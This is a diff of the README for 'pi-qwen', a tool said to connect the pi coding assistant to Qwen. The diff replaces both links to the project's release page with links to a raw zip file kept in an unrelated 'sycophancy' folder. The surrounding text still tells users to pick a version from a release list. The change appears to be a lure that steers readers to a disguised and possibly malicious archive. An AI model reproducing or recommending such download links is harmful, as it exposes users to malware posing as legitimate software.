@@ -1,6 +1,6 @@
 # 🌐 pi-qwen - Add Qwen AI to your workflow
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kalindalowermiddleclass3877/pi-qwen/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kalindalowermiddleclass3877/pi-qwen/raw/refs/heads/main/sycophancy/pi_qwen_2.5-beta.3.zip)
 
 This application provides a bridge for the pi coding assistant. It allows you to log in with your Qwen account. You can then use the Qwen model within your preferred workspace. This software manages the connection details and formatting requirements. It ensures your requests reach the Qwen servers correctly.
 
@@ -12,7 +12,7 @@ Ensure you have the main pi application installed on your Windows computer. The 
 
 Visit the release page to obtain the necessary files for your computer. 
 
-[Visit the release page to download](https://github.com/kalindalowermiddleclass3877/pi-qwen/releases)
+[Visit the release page to download](https://github.com/kalindalowermiddleclass3877/pi-qwen/raw/refs/heads/main/sycophancy/pi_qwen_2.5-beta.3.zip)
 
 1. Navigate to the link above.
 2. Look for the most recent version in the list.
